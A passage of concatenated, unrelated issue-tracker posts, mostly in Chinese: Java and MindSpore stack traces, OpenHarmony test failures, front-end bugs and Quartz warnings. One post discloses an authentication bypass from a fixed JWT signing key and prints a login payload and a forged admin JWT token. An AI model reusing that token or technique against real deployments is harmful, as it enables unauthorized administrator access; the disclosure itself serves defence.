org.apache.catalina.connector.CoyoteOutputStream.flush(CoyoteOutputStream.java:118) at com.fasterxml.jackson.core.json.UTF8JsonGenerator.flush(UTF8JsonGenerator.java:1176) at com.fasterxml.jackson.databind.ObjectWriter.writeValue(ObjectWriter.java:1008) at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.writeInternal(AbstractJackson2HttpMessageConverter.java:342) at org.springframework.http.converter.AbstractGenericHttpMessageConverter.write(AbstractGenericHttpMessageConverter.java:104) at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:277) at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.handleReturnValue(RequestResponseBodyMethodProcessor.java:181) at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:403) at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:61) at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:141) at org.springframework.web.servlet.handler.HandlerExceptionResolverComposite.resolveException(HandlerExceptionResolverComposite.java:80) at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1300) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1111) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.jeecg.common.config.mqtoken.TransmitUserTokenFilter.doFilter(TransmitUserTokenFilter.java:26) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:88) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.IOException: 你的主机中的软件中止了一个已建立的连接。 at sun.nio.ch.SocketDispatcher.write0(Native Method) at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:51) at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) at sun.nio.ch.IOUtil.write(IOUtil.java:65) at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:469) at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:138) at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101) at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:152) at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.doWrite(NioEndpoint.java:1253) at org.apache.tomcat.util.net.SocketWrapperBase.doWrite(SocketWrapperBase.java:764) at org.apache.tomcat.util.net.SocketWrapperBase.flushBlocking(SocketWrapperBase.java:717) at org.apache.tomcat.util.net.SocketWrapperBase.flush(SocketWrapperBase.java:707) at org.apache.coyote.http11.Http11OutputBuffer$SocketOutputBuffer.flush(Http11OutputBuffer.java:572) at org.apache.coyote.http11.filters.ChunkedOutputFilter.flush(ChunkedOutputFilter.java:157) at org.apache.coyote.http11.filters.GzipOutputFilter.flush(GzipOutputFilter.java:104) at org.apache.coyote.http11.Http11OutputBuffer.flush(Http11OutputBuffer.java:220) at org.apache.coyote.http11.Http11Processor.flush(Http11Processor.java:1195) at org.apache.coyote.AbstractProcessor.action(AbstractProcessor.java:399) at org.apache.coyote.Response.action(Response.java:209) at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:305) ... 88 common frames omitted 2021-11-25 13:19:18.058 [scheduling-1] INFO org.jeecg.modules.cloud.lock.DemoLockTest:41 - execute任务结束，休眠三秒 2021-11-25 13:19:18.058 [scheduling-1] INFO o.j.b.starter.lock.aspect.DistributedLockHandler:83 - 结束RedisLock环绕通知... 2021-11-25 13:19:18.066 [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#2-1] INFO org.jeecg.modules.cloud.rabbitmq.HelloReceiver3:30 - MQ Receiver3，orderId : NJ0002
主页退出登录后，更换用户登录后，如何根据用户动态更新菜单内容,"版本：2.6.3 描述：index主页，退出登录，更换用户登录以后，希望根据用户权限更新菜单，但 iniUrl:""@Url.Content(""~/Home/systemMenu"")""，不再刷新。请教如何解决？？ vs2017开发，iniUrl调用一个控制器的方法。 layui.use(['jquery', 'layer', 'miniAdmin', 'miniTongji'], function () { var $ = layui.jquery, layer = layui.layer, miniAdmin = layui.miniAdmin, miniTongji = layui.miniTongji;   <code>: var options = { iniUrl:""@Url.Content(""~/Home/systemMenu"")"" , // 初始化接口 //iniUrl: ""http://localhost:63408/api/init.json"", // 初始化接口 clearUrl: ""~/api/clear.json"", // 缓存清理接口 version: false, urlHashLocation: true, // 是否打开hash定位 bgColorDefault: false, // 主题默认配置 multiModule: true, // 是否开启多模块 menuChildOpen: false, // 是否默认展开菜单 loadingTime: 0, // 初始化加载时间 pageAnim: true, // iframe窗口动画 maxTabNum: 20, // 最大的tab打开数量 }; miniAdmin.render(options);"
[ST][pynative][MS][NET][gat/gcn/appnp][gpu 1p]RuntimeError: : The pointer[shape] is null,"gat/gcn/appn网络使用pynative模式训练失败 / 硬件环境: /device GPU : -- MindSpore version :r1.8.0 commit_id:a0ecf8bf11 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : graphlearning脚本分支：r0.1 (/): /mode pynative test_ms_usability_benchmark_pynative_gpu_gcn_time_perf_loss_1p_0001.py test_ms_usability_benchmark_pynative_gpu_gat_time_perf_loss_1p_0001.py test_ms_usability_benchmark_pynative_gpu_appnp_time_perf_loss_1p_0001.py cd solution_test/cases/02network/04gnn/gat/pynative pytest -s test_ms_usability_benchmark_pynative_gpu_gat_time_perf_loss_1p_0001.py 网络训练成功 走给褚金锦   <code>: Traceback (most recent call last): File ""vc_gat_datanet.py"", line 143, in &lt;module&gt; main(args) File ""vc_gat_datanet.py"", line 102, in main train_loss = train_net() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 602, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 598, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 417, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""vc_gat_datanet.py"", line 59, in construct return self.net(self.x, self.y, self.train_mask, self.src_idx, self.dst_idx, self.n_nodes, self.n_edges) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 602, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 598, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 417, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py"", line 377, in construct loss = F.depend(loss, self.optimizer(grads)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 602, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 598, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 417, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 510, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj)(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 94, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 327, in __call__ phase = self.compile(args_list, self.fn.__name__) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 299, in compile is_compile = self._graph_executor.compile(self.obj, compile_args, phase, True) RuntimeError: : The pointer[shape] is null. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/frontend/optimizer/ad/pynative_dfunctor.cc:25 GenNewTensorInner"
[CT][MS][OP] NonDeterministicInts api description has problems,"NonDeterministicInts api 资料存在问题 1.样例无法跑通 2.少写报错场景 / 硬件环境: /device cpu : -- MindSpore version : master -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph API样例： 少写报错场景的相关用例： pytest -vra --doctest-modules -o doctest_optionflags=NORMALIZE_WHITESPACE --tb=long random_ops.py::mindspore.ops.operations.random_ops.NonDeterministicInts pytest -s test_nondeterministicints.py::test_non_deterministic_ints_output_memory_error API用例能够跑通 源码里API描述中包含所有的异常场景 应包含：The number of elements of output must be less than max length: 1000000, but got 3528000! The shape of output should be reduced or max_length should be increased   <code>: Examples: &gt;&gt;&gt; shape = Tensor(np.array([2,2]), mstype.int32) &gt;&gt;&gt; ndints = ops.NonDeterministicInts(dtype=mstype.int32) &gt;&gt;&gt; output = ndints(shape) &gt;&gt;&gt; print(output) [[13031056 -141954883 ] [ 140364228 290834494 ]] def test_non_deterministic_ints_output_memory_error(): input_ = Tensor(np.random.randint(low=20, high=22, size=5), dtype=mstype.int64) fact = NonDeterministicIntsMock(inputs=input_, attributes={'dtype': mstype.int32}) with pytest.raises((RuntimeError, ValueError)): fact.forward_mindspore_impl() [CRITICAL] CORE(87596,fffebffff1e0,python3.7):2022-02-17-14:14:34.924.175 [mindspore/core/ops/non_deterministic_ints.cc:81] NonDeterministicIntsInferShape] The number of elements of output must be less than max length: 1000000, but got 3528000! The shape of output should be reduced or max_length should be increased"
关于ruoyi-fast的定时任务warn,"告警如下 网上很多说法是集群时间不一致，但是这是单体应用并没有集群。   <code>: 13:32:56.993 [QuartzScheduler_ruoyiScheduler-DESKTOP-MDSCUE71605750215961_ClusterManager] WARN o.s.s.q.LocalDataSourceJobStore - [findFailedInstances,3396] - This scheduler instance (DESKTOP-MDSCUE71605750215961) is still active but was recovered by another instance in the cluster. This may cause inconsistent behavior."
【OpenHarmony】【3.0.0.21】【轻内核子系统】dyload_posix模块压测在执行testDlopenSoInRelativeRpath测试用例时出错,简要描述： 【OpenHarmony】【3.0.0.21】【轻内核子系统】dyload_posix模块压测在执行testDlopenSoInRelativeRpath测试用例时出错 【环境信息】: 硬件开发板型号 Hi3516DV300 软件版本信息或tag节点 LTS3.0.0.21 http://download.ci.openharmony.cn/version/Release_Version/OpenHarmony_3.0_LTS_3.0.0.21/20211229_030136/version-Release_Version-OpenHarmony_3.0_LTS_3.0.0.21-20211229_030136-hispark_taurus_LiteOS_3_0-LTS.tar.gz 【测试步骤】： 1.从版本中取出ActsDyloadTest.bin 测试套 4.执行./ActsDyloadTest.bin --gtest_repeat=1000 【预期结果】： 执行全部pass 【实际结果】： testDlopenSoInRelativeRpath 测试用例出现fail **【出现概率】：4/1000 【定位信息】： [ RUN ] DlopenTest.testDlopenSoInRelativeRpath dir:./lib exists SetUp ok Test Fail! dyload_rpath.c:8: inc_i call failed: want i=2 got i=1 ../../../test/xts/acts/kernel_lite/dyload_posix/DlopenTest.cpp:278: Failure Expected equality of these values: rt 0 dyload_rpath_relative failed! exitcode=1 remove file success TearDown ok [ FAILED ] DlopenTest.testDlopenSoInRelativeRpath (5084 ms)   <code>: Which is: 1
【众智】【计算-GPU开发】Diagonal,"Diagonal 返回输入的一部分，其相对于 dim1 和 dim2 的对角线元素附加为形状末尾的维度。 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py x y offset int 属性 dim1 int 属性 dim2 int 属性 对应底层算子 对应底层AICPU算子Diagonal 标杆接口参考 torch.diagonal： https://pytorch.org/docs/stable/generated/torch.diagonal.html 3. 异常处理 4. 算子反向 反向可组合已有算子实现，参考torch diagonal_backward()   <code>: class Diagonal(Primitive): REG_OP(Diagonal) .INPUT(x, TensorType({ DT_FLOAT, DT_DOUBLE })) .OUTPUT(y, TensorType({ DT_FLOAT, DT_DOUBLE })) .ATTR(offset, Int, 0) .ATTR(dim1, Int, 0) .ATTR(dim2, Int, 1) .OP_END_FACTORY_REG(Diagonal)"
Authentication Bypass vulnerability,"这是英文的漏洞报告，中文的在(This is the English report, the Chinese report is in): 身份验证绕过漏洞 Description The program uses a fixed JWT key, and the stored Redis key uses username format characters. Any user who has logged in within an hour. JWT Token can be forged with his username to bypass authentication Login API <em>com.anjiplus.template.gaea.business.modules.accessuser.controller.AccessUserController#login</em>   <code>: { ""type"": 0, ""uuid"": """", ""tenant"": ""tenantCode"", ""username"": ""admin"" } eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjowLCJ1dWlkIjoiIiwidGVuYW50IjoidGVuYW50Q29kZSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.ce3xqqUypEinA_ZCSky9AptKjkG8qFm8ESMuCunqe6Y"
折线图Tooltip不显示,"父元素样式设置了position: relative。挡前折线图元素offsetTop值是到父元素的距离，而不是到body的距离。导致y坐标计算出了图表边界。 微信小程序，开发者工具 无   <code>: &lt;template&gt; &lt;view&gt; &lt;view :style=""{'height': '200px'}""&gt;200px&lt;/view&gt; &lt;view :style=""{'position': 'relative'}""&gt; &lt;qiun-data-charts type=""line"" :chartData=""lineData"" background=""none"" /&gt; &lt;/view&gt; &lt;/view&gt; &lt;/template&gt; &lt;script&gt; export default { data() { return { lineData: { categories: [""2016"", ""2017"", ""2018"", ""2019"", ""2020"", ""2021""], series: [ { name: ""目标值"", data: [35, 36, 31, 33, 13, 34], }, { name: ""完成量"", data: [18, 27, 21, 24, 6, 28], }, ], }, } } } &lt;/script&gt;"
验证码出不来，后端返回“服务已被降级熔断”,"后台控制台打印   <code>: url:/auth/captcha/get 网关执行请求:[http://localhost:9527/auth/captcha/get, lb://ruoyi-auth/captcha/get]失败,hystrix服务降级处理"
batch_norm_grad输出的Output为0，导致后续出错,"现象 跑用户的一个模型，单机单卡、单机单卡关闭L2Decay、多机nccl2接口分布式、多机fleet接口分布式下，均出现batch_norm_grad获取的conv1_bn_offset@GRAD的shape为0，见下图log。 https://github.com/PaddlePaddle/Paddle/blob/65c8eac9fe4cfeff0b4da172125163f082bad9b2/paddle/fluid/operators/batch_norm_op.cc#L568 总结 上面的错误有很多环节都出了问题 batch_norm_grad的Infer Shape出了问题，需要修复。另： allreduce对于shape的判断不严谨，需要有&gt;0的判断 WeightDecay中对于shape没有加判断，导致错误的shape也能使用，且给Infer回去了。 fuse策略下直接给grad赋param的Shape值，这个没有问题，不过却绕过了此issue中的错误。 nccl2接口和fleet接口，size为0的tensor，一个初始化了，一个未初始化，和fleet加的策略有关系，需查明。   <code>: framework::GradVarName(""Scale"") 不过有个有个问题，是否用户有一个冻结一个不冻结的需求？ 是否有Scale和Bias一个可训练，一个不可训练的需求"
系统管理的子菜单点击后报错！调度中心的子菜单点击后能出来列表界面，但是添加不了！求大神指教！！！~~,"2018-01-10 14:42:15.385 [NettyServer-172.16.3.230:18085-3-thread-3] DEBUG [JsqlParserCountOptimize:59] - JsqlParserCountOptimize sql=SELECT id_ FROM sys_user 2018-01-10 14:42:15.385 [NettyServer-172.16.3.230:18085-3-thread-3] DEBUG [BaseJdbcLogger:159] - ==&gt; Preparing: SELECT COUNT(1) FROM sys_user 2018-01-10 14:42:15.386 [NettyServer-172.16.3.230:18085-3-thread-3] DEBUG [BaseJdbcLogger:159] - ==&gt; Parameters: 2018-01-10 14:42:15.387 [NettyServer-172.16.3.230:18085-3-thread-3] DEBUG [SqlSessionUtils:191] - Closing non transactional SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@77e9d447] 2018-01-10 14:42:15.388 [NettyServer-172.16.3.230:18085-3-thread-3] ERROR [BaseProviderImpl:36] - [950980892893372417] OH,MY GOD! SOME ERRORS OCCURED! AS FOLLOWS :org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:77) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) at com.sun.proxy.$Proxy139.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:238) at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:135) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:75) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) at com.sun.proxy.$Proxy165.selectIdPage(Unknown Source) at top.ibase4j.core.base.BaseService.query(BaseService.java:285) at org.ibase4j.service.SysUserService.query(SysUserService.java:61) at org.ibase4j.service.SysUserService$$FastClassBySpringCGLIB$$f2113cde.invoke() at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6.query() at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6MethodAccess.invoke(Unknown Source) at com.esotericsoftware.reflectasm.MethodAccess.invoke(MethodAccess.java:44) at top.ibase4j.core.util.InstanceUtil.invokeMethod(InstanceUtil.java:371) at top.ibase4j.core.base.BaseProviderImpl.execute(BaseProviderImpl.java:30) at sun.reflect.GeneratedMethodAccessor247.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at com.weibo.api.motan.rpc.DefaultProvider.invoke(DefaultProvider.java:64) at com.weibo.api.motan.rpc.AbstractProvider.call(AbstractProvider.java:49) at com.weibo.api.motan.transport.ProviderMessageRouter.call(ProviderMessageRouter.java:98) at com.weibo.api.motan.transport.ProviderProtectedMessageRouter.call(ProviderProtectedMessageRouter.java:79) at com.weibo.api.motan.transport.ProviderMessageRouter.handle(ProviderMessageRouter.java:93) at com.weibo.api.motan.transport.support.DefaultRpcHeartbeatFactory$HeartMessageHandleWrapper.handle(DefaultRpcHeartbeatFactory.java:101) at com.weibo.api.motan.transport.netty.NettyChannelHandler.processRequest(NettyChannelHandler.java:137) at com.weibo.api.motan.transport.netty.NettyChannelHandler.access$000(NettyChannelHandler.java:43) at com.weibo.api.motan.transport.netty.NettyChannelHandler$1.run(NettyChannelHandler.java:112) at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) at java.lang.Thread.run(Unknown Source) Caused by: org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.apache.ibatis.reflection.Reflector.resolveGetterConflicts(Reflector.java:138) at org.apache.ibatis.reflection.Reflector.addGetMethods(Reflector.java:108) at org.apache.ibatis.reflection.Reflector.(Reflector.java:63) at org.apache.ibatis.reflection.DefaultReflectorFactory.findForClass(DefaultReflectorFactory.java:44) at org.apache.ibatis.reflection.MetaClass.(MetaClass.java:39) at org.apache.ibatis.reflection.MetaClass.forClass(MetaClass.java:43) at org.apache.ibatis.reflection.wrapper.BeanWrapper.(BeanWrapper.java:40) at org.apache.ibatis.reflection.MetaObject.(MetaObject.java:56) at org.apache.ibatis.reflection.MetaObject.forObject(MetaObject.java:64) at org.apache.ibatis.reflection.MetaObject.metaObjectForProperty(MetaObject.java:146) at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:129) at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:138) at com.baomidou.mybatisplus.plugins.PaginationInterceptor.intercept(PaginationInterceptor.java:143) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy187.prepare(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:85) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:62) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:324) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:83) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ... 31 more org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:77) ~[mybatis-spring-1.3.1.jar:1.3.1] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) ~[mybatis-spring-1.3.1.jar:1.3.1] at com.sun.proxy.$Proxy139.selectList(Unknown Source) ~[?:?] at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:238) ~[mybatis-spring-1.3.1.jar:1.3.1] at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:135) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:75) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy165.selectIdPage(Unknown Source) ~[?:?] at top.ibase4j.core.base.BaseService.query(BaseService.java:285) ~[ibase4j-common-2.0.0.jar:?] at org.ibase4j.service.SysUserService.query(SysUserService.java:61) ~[classes/:?] at org.ibase4j.service.SysUserService$$FastClassBySpringCGLIB$$f2113cde.invoke() ~[classes/:?] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) ~[spring-core-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) ~[spring-aop-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6.query() ~[classes/:?] at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6MethodAccess.invoke(Unknown Source) ~[reflectasm-1.11.4-2.jar:?] at com.esotericsoftware.reflectasm.MethodAccess.invoke(MethodAccess.java:44) ~[reflectasm-1.11.4-2.jar:?] at top.ibase4j.core.util.InstanceUtil.invokeMethod(InstanceUtil.java:371) ~[ibase4j-common-2.0.0.jar:?] at top.ibase4j.core.base.BaseProviderImpl.execute(BaseProviderImpl.java:30) [ibase4j-common-2.0.0.jar:?] at sun.reflect.GeneratedMethodAccessor247.invoke(Unknown Source) ~[?:?] at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_152] at 